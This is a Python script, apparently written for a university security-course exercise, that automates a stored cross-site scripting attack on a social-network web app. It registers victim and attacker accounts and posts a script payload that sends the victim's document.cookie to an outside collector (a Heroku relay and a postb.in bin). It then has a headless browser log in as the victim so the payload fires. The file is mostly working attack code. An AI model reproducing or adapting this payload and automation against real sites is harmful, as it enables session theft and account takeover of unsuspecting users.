import time

import fire
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options


def start_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=chrome_options)
    driver.set_page_load_timeout(5)
    driver.set_script_timeout(5)

    return driver


def attack(server: str = 'http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt',
           target_url: str = None,
           victim_username: str = 'victim7', victim_password: str = 'victim',
           hacker_username: str = 'hacker7', hacker_password: str = 'hacker',
           attack_everyone: bool = False):
    # Create postb.in bin if target_url is None
    if target_url is None:
        r = requests.post('https://postb.in/api/bin')
        bin_id = r.json()['binId']
        print(f'Access stolen data at: https://postb.in/b/{bin_id}')

        target_url = f'https://postb.in/{bin_id}'

    victim = {'username': victim_username, 'password': victim_password}
    hacker = {'username': hacker_username, 'password': hacker_password}

    vs = requests.Session()
    vs.post(url=server + '/register', data=victim)
    r = vs.post(url=server + '/login', data=victim)
    if not r.ok:
        raise ValueError(f'Could not login the victim with credentials: {victim}')

    hs = requests.Session()
    hs.post(url=server + '/register', data=hacker)
    r = hs.post(url=server + '/login', data=hacker)
    if not r.ok:
        raise ValueError(f'Could not login the hacker with credentials: {hacker}')

    print(f'Successfully logged in the victim {victim_username} and the hacker {hacker_username}')
    steal_cookies = f'''
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://sheltered-plateau-71445.herokuapp.com/{target_url}", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.send(JSON.stringify({{
            "cookie": document.cookie
        }}));
        //alert("You are under attack!");
    </script>'''

    visibility = 'Public' if attack_everyone else 'Friends'
    r = hs.post(url=server + '/create_post', data={'content': steal_cookies, 'type': visibility})
    if not r.ok:
        raise ValueError(f'Could not create malicious script:\n{steal_cookies}')
    print('Successfully created the malicious script')

    # hacker makes a friend request to the victim and the victim accepts it
    if not attack_everyone:
        hs.post(url=server + '/request_friend', data={'username': victim['username']})
        vs.post(url=server + '/pending_requests', data={'username': hacker['username']})

    # The victim opens the main page and sees the post created by the hacker
    driver = start_driver()
    driver.get(server + '/login')
    driver.find_element_by_id('username').send_keys(victim['username'])
    driver.find_element_by_id('password').send_keys(victim['password'])

    driver.find_element_by_class_name('btn-success').click()
    driver.add_cookie({'name': '_ga', 'value': 'GA1.2.663725531.1598468128'})

    driver.get(server)
    time.sleep(2)
    driver.close()


if __name__ == '__main__':
    fire.Fire(attack)
